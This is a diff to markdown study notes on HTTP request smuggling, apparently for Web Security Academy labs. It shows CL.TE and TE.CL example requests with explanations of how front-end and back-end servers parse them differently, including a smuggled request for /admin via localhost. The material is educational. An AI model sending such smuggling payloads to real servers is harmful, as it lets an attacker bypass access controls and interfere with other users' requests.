@@ -380,48 +380,58 @@ Observed any response status or response length difference.
 _Burp suite extensions : Param miner | HTTP Request Smuggler_
 
 #### Summary
-- 🔵 1st request
-- ⚪ 2nd request
-- 🔴 3rd request
-- ➡️⬅️ Content-Length interpreted by the server
-
 ##### CL.TE
-In that scenario :
-- The front end relies on Content-Length
-- The back-end relies on Transfer-Encoding
-
-Front end interpretation :
 ```
-🔵 POST / HTTP/1.1
-🔵 Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
-🔵 Content-Type: application/x-www-form-urlencoded
-🔵 Content-Length: 43⬅️
-🔵 Transfer-encoding: chunked
-🔵
-🔵 ➡️3
-🔵 a=1
-🔵 0
-🔵 
-🔵 GET /404 HTTP/1.1
-🔵 X-Ignore: X⬅️
+POST / HTTP/1.1
+Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Transfer-encoding: chunked
+
+3
+a=1
+0
+ 
+GET /404 HTTP/1.1
+X-Ignore: X
 ```
 
-Back end interpretation :
-```
-*** BACK END INTERPRETATION ***
-🔵 POST / HTTP/1.1
-🔵 Host: 0ae60020040cd411805762cb00b400b4.web-security-academy.net
-🔵 Content-Type: application/x-www-form-urlencoded
-🔵 Content-Length: 43
-🔵 ➡️Transfer-encoding: chunked⬅️
-🔵 
-🔵 ➡️3
-🔵 a=1
-🔵 0⬅️
+###### Front-end
+The front end relies on `Content-Length: 43`, which is the length of the whole request.
 
-⚪ GET /404 HTTP/1.1
-⚪ X-Ignore: X
+###### Back-end
+The back-end relies on `Transfer-Encoding: chunked`.
+1. The back-end reads 0x03 (3) bytes, which is `a=1`
+2. The back-end reads 0x00 (0) bytes, which means this is the end of the request
+3. The back-end now interprets the end of the request as a new request to /404
+
+##### TE.CL
 ```
+POST / HTTP/1.1
+Host: 0aba00db04538e6c837c561b00b40058.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+3f
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 15
+
+a=b
+0
+
+
+```
+
+###### Front-end
+The front end relies on `Transfer-Encoding: chunked` :
+1. The front-end reads 0x3f (63) bytes
+2. The front-end reads 0x00 (0) bytes, which means this is the end of the request
+
+###### Back-end
+The back-end relies on `Content-Length: 4`.
+1. The back-end 4 bytes, which is `3f\r\n`, then it is the end of the request
+2. The back-end reads its buffers and assumes a new request arrived by receiving GET /admin
 
 
 #### Step 1 - Scan
